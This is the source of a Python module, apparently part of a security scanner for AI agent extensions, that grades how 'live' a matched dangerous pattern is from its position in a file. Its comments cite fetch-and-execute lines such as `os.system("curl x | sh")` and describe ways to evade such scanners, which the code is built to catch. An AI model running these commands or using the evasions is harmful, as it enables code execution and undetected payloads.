"""Position taxonomy — RULES.md section 3.

Position sets `confidence` and nothing else. The pattern is equally dangerous
wherever it appears; what changes is the odds that it is live.

This is the load-bearing mechanism of the whole ruleset. Without it the scanner
flags itself, every security skill, every README documenting an attack, and every
test fixture. It is also the most heuristic part of the tool — treat a v0 result
here as an experiment, not a guarantee.
"""

from __future__ import annotations

import re
from pathlib import PurePosixPath

ACTIVE = "active"
ILLUSTRATIVE = "illustrative"
DOCUMENTARY = "documentary"

_ORDER = [ACTIVE, ILLUSTRATIVE, DOCUMENTARY]

# Directories whose contents are illustrative by convention.
_ILLUSTRATIVE_DIRS = {
    "test", "tests", "__tests__", "spec", "specs",
    "fixture", "fixtures", "example", "examples", "sample", "samples",
    "testdata", "golden", "goldens", "snapshots",
}

# Headings under which a dangerous pattern is being shown, not invoked.
_ILLUSTRATIVE_HEADING = re.compile(
    r"(?i)\b(example|examples|sample|don'?t|do not|bad|anti-?pattern|"
    r"avoid|never|wrong|incorrect|vulnerab|attack|threat|detect|rule|"
    r"what we (?:look for|flag)|red flag)\b"
)

# A fence stops being illustrative when the sentence above it says to run it.
# The lead must be *directive toward the fence* — it ends with a colon, or names
# "the following"/"this". A bare verb anywhere in the sentence is not enough:
# "It does not block, install, or run anything." would otherwise activate the
# example output block that follows it.
_IMPERATIVE_LEAD = re.compile(
    r"(?i)(?:\b(run|execute|paste|copy|apply|invoke|add|use|ejecut[áa]?|corr[ée])\b"
    r"[^.\n]{0,60}(?::\s*$|\b(the following|this|these)\b)"
    r"|^\s*(run|execute|ejecut[áa]?|corr[ée])\b[^.\n]{0,40}:\s*$)"
)

# Imperative mood at the head of a markdown prose line.
_IMPERATIVE_VERB = re.compile(
    r"(?i)^\s*(?:[-*+]\s+|\d+[.)]\s+)?"
    r"(run|execute|install|download|fetch|curl|wget|send|post|upload|"
    r"read|write|append|delete|remove|create|copy|move|export|set|"
    r"add|register|enable|disable|configure|source|eval|chmod|sudo|"
    r"always|never|you must|you should|make sure to|be sure to|ensure that)\b"
)

_FENCE = re.compile(r"^\s*(```+|~~~+)\s*([A-Za-z0-9_+-]*)")
_HEADING = re.compile(r"^\s*(#{1,6})\s+(.*)$")
_TABLE_ROW = re.compile(r"^\s*\|")
_BLOCKQUOTE = re.compile(r"^\s*>")

_TEXT_CODE_SUFFIXES = {
    ".sh", ".bash", ".zsh", ".fish", ".ps1", ".bat", ".cmd",
    ".py", ".js", ".mjs", ".cjs", ".ts", ".rb", ".pl", ".php", ".lua", ".r",
}
_CONFIG_SUFFIXES = {".json", ".toml", ".yaml", ".yml", ".ini", ".cfg", ".conf", ".env"}
_DOC_SUFFIXES = {".md", ".markdown", ".mdx", ".rst", ".txt", ".adoc"}


# Execution sinks. A string literal is inert data UNLESS it flows into one of
# these — the same logic as an imperative sentence above a markdown fence.
# Blanket-demoting string literals would make `os.system("curl x | sh")` invisible,
# which is a trivial bypass.
# Two alternations, because the terminator differs. Names end at a word
# boundary; call forms end at `(` and must NOT be followed by \b — `\b` after
# `(` needs a word character next, so `Bash("curl x | sh")` (quote after the
# paren) never matched, and the most direct agent-native exec sink there is was
# invisible to the guard below.
_EXEC_SINK = re.compile(
    r"\b(?:os\.system|os\.popen|subprocess\.|Popen|check_output"
    r"|commands\.getoutput|child_process|execSync|spawnSync|shell_exec"
    r"|passthru|shell\s*=\s*True|eval|exec|run_command)\b"
    r"|\b(?:system|Bash|popen|execve|execl)\s*\("
)


def in_string_literal(line: str, index: int) -> bool:
    """Is `index` inside a quoted literal on this line?

    Deliberately simple: a rule catalogue holds attack patterns as data, and
    a pattern that is data is not an invocation.
    """
    quote: str | None = None
    i = 0
    while i < min(index, len(line)):
        ch = line[i]
        if quote:
            if ch == "\\":
                i += 2
                continue
            if ch == quote:
                quote = None
        elif ch in "\"'":
            quote = ch
        i += 1
    return quote is not None


# A regex literal is definitionally a *description* of a pattern, not a value.
# This is the source-code equivalent of a markdown table row: the strongest
# available signal that the dangerous text is catalogued, not invoked.
_REGEX_CONSTRUCTION = re.compile(
    r"re\.(compile|search|match|findall|finditer|sub)\s*\(|_r\s*\(|RegExp\s*\(|=~|"
    # A dict/JSON key quotes the name: `"regex": r"..."` — the closing quote sits
    # between the name and the colon, which a bare \bregex\s*[:=] never sees.
    r"\b(regexp?|pattern|matcher)[\"']?\s*[:=]"
)
_REGEX_SHAPE = re.compile(
    r"\\[bswdWSDA]|\[\^|\{\d*,\d*\}|\(\?[:=!i]|\(\?<[=!]|\\\.|\\[dws]\+")


def _exec_sink_outside_literal(line: str) -> bool:
    """Is there an execution sink *around* the literal, rather than inside it?

    The guard exists so `os.system("curl x | sh")` never gets demoted — there the
    sink brackets the string. A sink named *inside* the quotes is the opposite
    case: `"Warning: eval() executes arbitrary code"` is prose about eval, and
    matching a bare word anywhere on the line makes every security tool's own
    warning text look like a live eval.
    """
    return any(not in_string_literal(line, m.start())
               for m in _EXEC_SINK.finditer(line))


def in_inline_code(line: str, index: int) -> bool:
    """Is `index` inside a `backtick` span? Content shown in inline code is being
    quoted, not emitted — a token in backticks is documentation, like a fence."""
    return line.count("`", 0, index) % 2 == 1


# No trailing `\s` requirement: `#os.system("curl x | sh")` is a comment, and
# demanding a space after the marker made it read as live code.
#
# `--` is deliberately absent. It is a comment marker in SQL and Lua, neither of
# which shows up in agent extensions, while in shell it is the standard
# end-of-options separator: `sh -c -- "curl x | sh"` was being read as a comment
# from the `--` onward, which hid the payload behind two levels of demotion. A
# false negative on a real payload costs more than a false positive on a Lua
# comment nobody ships.
_COMMENT = re.compile(r"(?:^|\s)(?:#|//)")


def _in_comment(line: str, index: int) -> bool:
    for match in _COMMENT.finditer(line):
        if match.start() < index and not in_string_literal(line, match.start()):
            return True
    return False


def literal_demotion(line: str, index: int) -> int:
    """Confidence levels a code-file match loses for being inert data.

    Never demotes a LIVE execution sink — one that brackets the literal, as in
    `os.system("curl x | sh")`. Demoting that would be a trivial bypass. A sink
    that is itself commented out is not live, and a sink NAMED INSIDE the quotes
    is prose about the sink, not a call to it.

    Order is load-bearing, and it is the reverse of what it was:

    The exec-sink guard must be consulted BEFORE the regex-shape check. Putting
    regex first was meant to protect a rule catalogue — an entry like
    `{"regex": r"...eval\\("}` is data even though it names an execution
    function — but it also let any live sink buy two levels of demotion by
    appending a decoy: `os.system("curl x|sh"); RE=r"\\d+[^z]"` scored two shape
    tokens and dropped out of the headline entirely.

    The two cases never actually needed the ordering to tell them apart. In the
    catalogue entry the sink name sits INSIDE the raw string, so
    `_exec_sink_outside_literal` is already False and the regex branch below is
    still reached. In the evasion the sink brackets the literal, so the guard is
    True and must win. `tests/unit_test.py` pins both directions, and
    `fixtures/benign/security-tool` pins the catalogue case end to end.
    """
    if _in_comment(line, index):
        return 2
    if not in_string_literal(line, index):
        return 0
    if _exec_sink_outside_literal(line):
        return 0
    # Structurally a regex: a description of a pattern, not a value. This is the
    # source-code equivalent of a markdown table row.
    if _REGEX_CONSTRUCTION.search(line) or len(_REGEX_SHAPE.findall(line)) >= 2:
        return 2
    return 1


def demote(confidence: str, position: str) -> str:
    """Lower confidence by position. Floor is `low`."""
    levels = ["high", "medium", "low"]
    steps = {ACTIVE: 0, ILLUSTRATIVE: 1, DOCUMENTARY: 2}[position]
    try:
        idx = levels.index(confidence)
    except ValueError:
        return "low"
    return levels[min(idx + steps, len(levels) - 1)]


def in_sample_dir(relpath: str) -> bool:
    """Is the file inside a dedicated test/fixtures/examples directory?

    A single chokepoint: nothing from such a file may exceed low confidence,
    overriding every per-rule exemption. This is what stops a scanner from
    flagging its own attack fixtures — the one property section 3 exists to give.
    """
    parts = PurePosixPath(relpath).parts[:-1]
    return any(part.lower() in _ILLUSTRATIVE_DIRS for part in parts)


def file_base_position(relpath: str, invoked: bool = False) -> str:
    """Base position implied by where the file sits and what it is.

    A whole test/fixtures/examples directory is a stronger 'not live' signal than
    a fenced snippet under an example heading — it reads as documentary (two
    levels, floor low), enough to leave the headline.

    `invoked` is the answer the old docstring deferred to "section 5, deferred":
    the reachability graph now knows which files an entry point actually tells
    the model to RUN, as opposed to merely mentioning. For those, the directory
    convention loses — parking a live payload in `examples/` and invoking it from
    SKILL.md was a two-level demotion an attacker got for the price of a
    directory name.
    """
    p = PurePosixPath(relpath)
    if not invoked and any(part.lower() in _ILLUSTRATIVE_DIRS for part in p.parts[:-1]):
        return DOCUMENTARY
    suffix = p.suffix.lower()
    if suffix in _TEXT_CODE_SUFFIXES or suffix in _CONFIG_SUFFIXES:
        return ACTIVE
    if suffix in _DOC_SUFFIXES:
        return DOCUMENTARY
    return ACTIVE


# Line kinds, so an exemption can target genuine body prose without also lifting
# attack phrases quoted in a table cell or blockquote (a rules catalogue).
PROSE = "prose"
STRUCTURAL = "structural"  # table, heading, blockquote, fence, code, docstring


def classify_lines(relpath: str, text: str,
                   invoked: bool = False) -> list[tuple[str, str]]:
    """(position, kind) for every line, 0-indexed.

    `invoked` means an entry point instructs the model to run this file; it
    overrides the sample-directory convention. See `file_base_position`.
    """
    base = file_base_position(relpath, invoked)
    lines = text.splitlines()

    suffix = PurePosixPath(relpath).suffix.lower()
    if suffix not in _DOC_SUFFIXES:
        return _classify_code(lines, base, suffix)

    classified = _classify_markdown(lines, base)
    # Only a sample LOCATION caps the lines. The .md extension alone must not:
    # `file_base_position` returns documentary for every markdown file, and
    # using that as a floor would flatten imperative body prose — the exact
    # thing a skill's instructions are made of — into documentary everywhere.
    if invoked or not in_sample_dir(relpath):
        return classified
    floor = _ORDER.index(DOCUMENTARY)
    return [(_ORDER[max(_ORDER.index(p), floor)], k) for p, k in classified]


# Triple-quoted / heredoc bodies are prose, not statements. A security tool that
# documents attacks in its docstrings is the canonical false positive without this.
_TRIPLE = re.compile(r'"""|\'\'\'')
_TRIPLE_QUOTE_SUFFIXES = {".py", ".pyi", ".pyw"}


def _triple_opener(line: str) -> tuple[str, int] | None:
    """First triple-quote that actually opens a docstring, with its index.

    A marker sitting inside a `#` comment does not open anything: a comment
    that merely mentions a docstring delimiter is still a comment. Without
    this check a commented marker silenced every line beneath it.
    """
    for match in _TRIPLE.finditer(line):
        before = line[:match.start()]
        hashes = [i for i, ch in enumerate(before) if ch == "#"]
        if any(not in_string_literal(line, i) for i in hashes):
            return None  # the marker is inside a comment
        return match.group(0), match.start()
    return None


def _classify_code(lines: list[str], base: str, suffix: str) -> list[tuple[str, str]]:
    if base in (ILLUSTRATIVE, DOCUMENTARY):
        return [(base, STRUCTURAL)] * len(lines)

    # Triple-quote tracking is Python-only. Applying it everywhere let a single
    # `# """` at the top of a .sh file mark the whole file documentary, which
    # demoted every finding in it to low AND made taint skip it entirely: five
    # characters erased an SSH-key exfiltration chain.
    if suffix not in _TRIPLE_QUOTE_SUFFIXES:
        return [(ACTIVE, STRUCTURAL)] * len(lines)

    positions: list[tuple[str, str]] = []
    in_docstring = False
    delim = ""
    for raw in lines:
        if in_docstring:
            positions.append((DOCUMENTARY, STRUCTURAL))
            if delim in raw:
                in_docstring = False
            continue
        opener = _triple_opener(raw)
        if opener:
            first, index = opener
            after = raw[index + len(first):]
            # Opens and does not close on the same line -> body is documentary.
            if first not in after:
                in_docstring = True
                delim = first
                positions.append((DOCUMENTARY, STRUCTURAL))
                continue
        positions.append((ACTIVE, STRUCTURAL))
    return positions


def _classify_markdown(lines: list[str], base: str) -> list[tuple[str, str]]:
    positions: list[tuple[str, str]] = []
    in_fence = False
    fence_marker = ""
    fence_is_active = False
    fence_is_output = False
    heading_illustrative = False
    prev_prose = ""

    for raw in lines:
        fence_match = _FENCE.match(raw)

        if in_fence:
            if fence_match and raw.strip().startswith(fence_marker):
                in_fence = False
                positions.append((DOCUMENTARY if fence_is_output else ILLUSTRATIVE, STRUCTURAL))
                continue
            if fence_is_active:
                positions.append((ACTIVE, STRUCTURAL))
            else:
                positions.append((DOCUMENTARY if fence_is_output else ILLUSTRATIVE, STRUCTURAL))
            continue

        if fence_match:
            in_fence = True
            fence_marker = fence_match.group(1)[:3]
            lang = fence_match.group(2).strip().lower()
            # A fence introduced by "run the following" is live regardless of
            # being fenced. Being inside a code block is not proof of inertness.
            fence_is_active = bool(_IMPERATIVE_LEAD.search(prev_prose)) and not heading_illustrative
            # A fence with no declared language is sample output, not code.
            fence_is_output = not lang and not fence_is_active
            positions.append((DOCUMENTARY if fence_is_output else ILLUSTRATIVE, STRUCTURAL))
            continue

        heading = _HEADING.match(raw)
        if heading:
            heading_illustrative = bool(_ILLUSTRATIVE_HEADING.search(heading.group(2)))
            positions.append((DOCUMENTARY, STRUCTURAL))
            prev_prose = ""
            continue

        if _TABLE_ROW.match(raw) or _BLOCKQUOTE.match(raw):
            positions.append((DOCUMENTARY, STRUCTURAL))
            continue

        stripped = raw.strip()
        if not stripped:
            positions.append((DOCUMENTARY if base == DOCUMENTARY else base, STRUCTURAL))
            continue

        prev_prose = stripped

        if heading_illustrative:
            positions.append((ILLUSTRATIVE, PROSE))
        elif _IMPERATIVE_VERB.match(raw):
            # Imperative prose in a skill body IS an instruction to the model.
            positions.append((ACTIVE, PROSE))
        else:
            positions.append((DOCUMENTARY, PROSE))

    return positions
